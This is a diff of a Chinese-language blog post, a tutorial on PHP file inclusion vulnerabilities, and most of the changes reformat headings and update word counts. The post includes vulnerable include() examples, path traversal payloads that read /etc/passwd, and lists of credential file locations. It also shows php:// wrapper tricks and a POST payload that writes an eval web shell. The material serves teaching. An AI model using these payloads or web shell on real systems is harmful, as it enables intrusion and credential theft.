@@ -16,7 +16,7 @@
 
 <html class="theme-next mist use-motion" lang="zh-CN">
 <head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="UTF-8">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
@@ -119,20 +119,20 @@
 
 
 
-  <meta name="description" content="未完成 原理服务器执行PHP文件时,可以通过文件包含函数加载另一个文件中的PHP代码来执行. PHP中文件包含函数有以下四种. 1234require()require_once()include()include_once() include在包含的过程中如果出现错误,会抛出一个警告,程序继续正常运行;而require函数出现错误的时候,会直接报错并退出程序的执行. 而include_once(">
+  <meta name="description" content="未完成 原理 服务器执行PHP文件时,可以通过文件包含函数加载另一个文件中的PHP代码来执行. PHP中文件包含函数有以下四种. 1234require()require_once()include()include_once() include在包含的过程中如果出现错误,会抛出一个警告,程序继续正常运行;而require函数出现错误的时候,会直接报错并退出程序的执行. 而includ">
 <meta name="keywords" content="PHP">
 <meta property="og:type" content="article">
 <meta property="og:title" content="IS-web-PHP-文件包含漏洞">
 <meta property="og:url" content="https://hitworld.github.io/posts/102663db/index.html">
 <meta property="og:site_name" content="w4rd3n">
-<meta property="og:description" content="未完成 原理服务器执行PHP文件时,可以通过文件包含函数加载另一个文件中的PHP代码来执行. PHP中文件包含函数有以下四种. 1234require()require_once()include()include_once() include在包含的过程中如果出现错误,会抛出一个警告,程序继续正常运行;而require函数出现错误的时候,会直接报错并退出程序的执行. 而include_once(">
+<meta property="og:description" content="未完成 原理 服务器执行PHP文件时,可以通过文件包含函数加载另一个文件中的PHP代码来执行. PHP中文件包含函数有以下四种. 1234require()require_once()include()include_once() include在包含的过程中如果出现错误,会抛出一个警告,程序继续正常运行;而require函数出现错误的时候,会直接报错并退出程序的执行. 而includ">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://hitworld.github.io/posts/102663db/1.png">
 <meta property="og:image" content="https://hitworld.github.io/posts/102663db/2.png">
 <meta property="og:updated_time" content="2020-08-09T06:34:17.836Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="IS-web-PHP-文件包含漏洞">
-<meta name="twitter:description" content="未完成 原理服务器执行PHP文件时,可以通过文件包含函数加载另一个文件中的PHP代码来执行. PHP中文件包含函数有以下四种. 1234require()require_once()include()include_once() include在包含的过程中如果出现错误,会抛出一个警告,程序继续正常运行;而require函数出现错误的时候,会直接报错并退出程序的执行. 而include_once(">
+<meta name="twitter:description" content="未完成 原理 服务器执行PHP文件时,可以通过文件包含函数加载另一个文件中的PHP代码来执行. PHP中文件包含函数有以下四种. 1234require()require_once()include()include_once() include在包含的过程中如果出现错误,会抛出一个警告,程序继续正常运行;而require函数出现错误的时候,会直接报错并退出程序的执行. 而includ">
 <meta name="twitter:image" content="https://hitworld.github.io/posts/102663db/1.png">
 
 
@@ -188,7 +188,7 @@
       .logo-line-after i { right: initial; }
     }
   </style>
-</noscript>
+</noscript><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 
 </head>
 
@@ -199,7 +199,7 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
@@ -506,7 +506,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">2.6k</span>
+                <span title="本文字数">2.7k</span>
               
 
               
@@ -541,38 +541,47 @@
 
       
         <p>未完成</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>服务器执行<code>PHP</code>文件时,可以通过文件包含函数加载另一个文件中的<code>PHP</code>代码来执行.</p>
+<h2 id="原理">原理</h2>
+<p>服务器执行<code>PHP</code>文件时,可以通过文件包含函数加载另一个文件中的<code>PHP</code>代码来执行.</p>
 <p><code>PHP</code>中文件包含函数有以下四种.</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span>()</span><br><span class="line"><span class="keyword">require_once</span>()</span><br><span class="line"><span class="keyword">include</span>()</span><br><span class="line"><span class="keyword">include_once</span>()</span><br></pre></td></tr></table></figure>
 <p><code>include</code>在包含的过程中如果出现错误,会抛出一个警告,程序继续正常运行;而<code>require</code>函数出现错误的时候,会直接报错并退出程序的执行.</p>
 <p>而<code>include_once()</code>,<code>require_once()</code>这两个函数与前两个的不同之处在于这两个函数只包含一次,以避免函数重定义,变量重新赋值等问题.</p>
-<h2 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h2><p>文件包含函数加载的参数没有经过过滤或者严格的定义,可以被用户控制,包含其他恶意文件,导致了执行了非预期的代码.</p>
+<h2 id="漏洞实例">漏洞实例</h2>
+<p>文件包含函数加载的参数没有经过过滤或者严格的定义,可以被用户控制,包含其他恶意文件,导致了执行了非预期的代码.</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h3><p><code>Local File Inclusion</code>(<code>LFI</code>).</p>
+<h3 id="本地文件包含漏洞">本地文件包含漏洞</h3>
+<p><code>Local File Inclusion</code>(<code>LFI</code>).</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">'/home/wwwrun/'</span>.$file.<span class="string">'.php'</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'/home/wwwrun/'</span>.$file.<span class="string">'.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p><code>%00</code>截断,<code>?file=../../../../../../../../../etc/passwd%00</code>读取<code>/etc/passwd</code>.需要<code>magic_quotes_gpc=off</code>,<code>PHP</code>小于<code>5.3.4</code>有效.</p>
 <p>路径长度截断,<code>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</code>.<code>Linux</code>需要文件名长于<code>4096</code>,<code>Windows</code>需要长于<code>256</code>.</p>
 <p>点号截断,<code>?file=../../../../../../../../../boot.ini/………[…]…………</code>.只适用<code>Windows</code>,点号需要长于<code>256</code>.</p>
-<h4 id="常见的敏感信息路径"><a href="#常见的敏感信息路径" class="headerlink" title="常见的敏感信息路径"></a>常见的敏感信息路径</h4><p><code>Windows</code>系统.</p>
+<h4 id="常见的敏感信息路径">常见的敏感信息路径</h4>
+<p><code>Windows</code>系统.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini</span><br><span class="line"><span class="comment"># 查看系统版本</span></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml</span><br><span class="line"><span class="comment"># IIS配置文件</span></span><br><span class="line">c:\windows\repair\sam</span><br><span class="line"><span class="comment"># 存储Windows系统初次安装的密码</span></span><br><span class="line">c:\ProgramFiles\mysql\my.ini</span><br><span class="line"><span class="comment"># MySQL配置</span></span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD</span><br><span class="line"><span class="comment"># MySQL root密码</span></span><br><span class="line">c:\windows\php.ini</span><br><span class="line"><span class="comment"># php 配置信息</span></span><br></pre></td></tr></table></figure>
 <p><code>Linux/Unix</code>系统.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line"><span class="comment"># 账户信息</span></span><br><span class="line">/etc/shadow</span><br><span class="line"><span class="comment"># 账户密码文件</span></span><br><span class="line">/usr/<span class="built_in">local</span>/app/apache2/conf/httpd.conf</span><br><span class="line"><span class="comment"># Apache2默认配置文件</span></span><br><span class="line">/usr/<span class="built_in">local</span>/app/apache2/conf/extra/httpd-vhost.conf</span><br><span class="line"><span class="comment"># 虚拟网站配置</span></span><br><span class="line">/usr/<span class="built_in">local</span>/app/php5/lib/php.ini</span><br><span class="line"><span class="comment"># PHP相关配置</span></span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line"><span class="comment"># Apache配置文件</span></span><br><span class="line">/etc/my.conf</span><br><span class="line"><span class="comment"># mysql配置文件</span></span><br><span class="line">/proc/self/environ</span><br><span class="line"><span class="comment"># 存储user-agent的值</span></span><br></pre></td></tr></table></figure>
-<h3 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h3><p><code>Remote File Inclusion</code>(<code>RFI</code>).<code>PHP</code>的配置文件<code>allow_url_fopen</code>和<code>allow_url_include</code>设置为<code>ON</code>,<code>include/require</code>等包含函数可以加载远程文件.</p>
+<h3 id="远程文件包含漏洞">远程文件包含漏洞</h3>
+<p><code>Remote File Inclusion</code>(<code>RFI</code>).<code>PHP</code>的配置文件<code>allow_url_fopen</code>和<code>allow_url_include</code>设置为<code>ON</code>,<code>include/require</code>等包含函数可以加载远程文件.</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>($_GET[<span class="string">'filename'</span>] . <span class="string">".html"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>可以使用<code>?</code>,<code>#</code>,<code></code>绕过后缀.</p>
-<h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><p><code>PHP</code>带有很多内置<code>URL</code>风格的封装协议,可用于部分文件系统函数.</p>
+<h3 id="php伪协议">PHP伪协议</h3>
+<p><code>PHP</code>带有很多内置<code>URL</code>风格的封装协议,可用于部分文件系统函数.</p>
 <img src="/posts/102663db/1.png" title="PHP伪协议">
-<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>条件:需要开启<code>allow_url_include</code>,不需要开启<code>allow_url_fopen</code>.</p>
+<h4 id="phpfilter">php://filter</h4>
+<p>条件:需要开启<code>allow_url_include</code>,不需要开启<code>allow_url_fopen</code>.</p>
 <p><code>php://filter</code>(本地磁盘文件进行读取).</p>
 <img src="/posts/102663db/2.png" title="php://filter">
 <p>用法:<code>?filename=php://filter/convert.base64-encode/resource=xxx.php</code>,同<code>?filename=php://filter/read=convert.base64-encode/resource=xxx.php</code>.</p>
-<h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>条件:需要开启<code>allow_url_fopen</code>,不需要开启<code>allow_url_include</code>.</p>
-<p><code>php://input</code>用于访问请求的原始数据的只读流.即直接读取到<code>POST</code>上没有经过解析的原始数据.<code>enctype=&quot;multipart/form-data&quot;</code>时无效.</p>
-<p>用法:<code>?file=php://input</code>,数据利用<code>POST</code>传过去;<br>可以使用<code>file_get_contents(&quot;php://input&quot;)</code>读取<code>post</code>数据.</p>
+<h4 id="phpinput">php://input</h4>
+<p>条件:需要开启<code>allow_url_fopen</code>,不需要开启<code>allow_url_include</code>.</p>
+<p><code>php://input</code>用于访问请求的原始数据的只读流.即直接读取到<code>POST</code>上没有经过解析的原始数据.<code>enctype="multipart/form-data"</code>时无效.</p>
+<p>用法:<code>?file=php://input</code>,数据利用<code>POST</code>传过去; 可以使用<code>file_get_contents("php://input")</code>读取<code>post</code>数据.</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>如果<code>php</code>配置文件中同时开启<code>allow_url_fopen</code>和<code>allow_url_include</code>(<code>PHP &lt; 5.3.0</code>),就可以造成任意代码执行.<br>可以理解成远程文件包含漏洞,即<code>POST</code>过去<code>PHP</code>代码然后执行.</p>
-<p>例如<code>POST</code>数据为<code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;</code>就会在当前目录下写入木马.</p>
-<h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><p>条件:需要开启<code>allow_url_include</code>,不需要开启<code>allow_url_fopen</code>.</p>
+<p>如果<code>php</code>配置文件中同时开启<code>allow_url_fopen</code>和<code>allow_url_include</code>(<code>PHP &lt; 5.3.0</code>),就可以造成任意代码执行. 可以理解成远程文件包含漏洞,即<code>POST</code>过去<code>PHP</code>代码然后执行.</p>
+<p>例如<code>POST</code>数据为<code>&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt;</code>就会在当前目录下写入木马.</p>
+<h4 id="data">data://</h4>
+<p>条件:需要开启<code>allow_url_include</code>,不需要开启<code>allow_url_fopen</code>.</p>
 <p>数据流封装器,和<code>php://</code>相似都是利用了流的概念,将原本文件流重定向到了用户可控制的输入流中,和<code>php</code>伪协议的<code>php://input</code>类似.</p>
 <p>用法:<code>data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</code>.</p>
 
@@ -889,7 +898,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞实例"><span class="nav-number">2.</span> <span class="nav-text">漏洞实例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#本地文件包含漏洞"><span class="nav-number">2.1.</span> <span class="nav-text">本地文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#常见的敏感信息路径"><span class="nav-number">2.1.1.</span> <span class="nav-text">常见的敏感信息路径</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程文件包含漏洞"><span class="nav-number">2.2.</span> <span class="nav-text">远程文件包含漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP伪协议"><span class="nav-number">2.3.</span> <span class="nav-text">PHP伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php-filter"><span class="nav-number">2.3.1.</span> <span class="nav-text">php://filter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-input"><span class="nav-number">2.3.2.</span> <span class="nav-text">php://input</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#data"><span class="nav-number">2.3.3.</span> <span class="nav-text">data://</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞实例"><span class="nav-number">2.</span> <span class="nav-text">漏洞实例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#本地文件包含漏洞"><span class="nav-number">2.1.</span> <span class="nav-text">本地文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#常见的敏感信息路径"><span class="nav-number">2.1.1.</span> <span class="nav-text">常见的敏感信息路径</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程文件包含漏洞"><span class="nav-number">2.2.</span> <span class="nav-text">远程文件包含漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php伪协议"><span class="nav-number">2.3.</span> <span class="nav-text">PHP伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#phpfilter"><span class="nav-number">2.3.1.</span> <span class="nav-text">php://filter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phpinput"><span class="nav-number">2.3.2.</span> <span class="nav-text">php://input</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#data"><span class="nav-number">2.3.3.</span> <span class="nav-text">data://</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
@@ -921,7 +930,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">710k</span>
+    <span title="站点总字数">720k</span>
   
 
   
@@ -930,7 +939,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">10:46</span>
+    <span title="站点阅读时长">10:54</span>
   
 </div>
 
@@ -1581,5 +1590,5 @@
   
   <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
   
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
 </html>
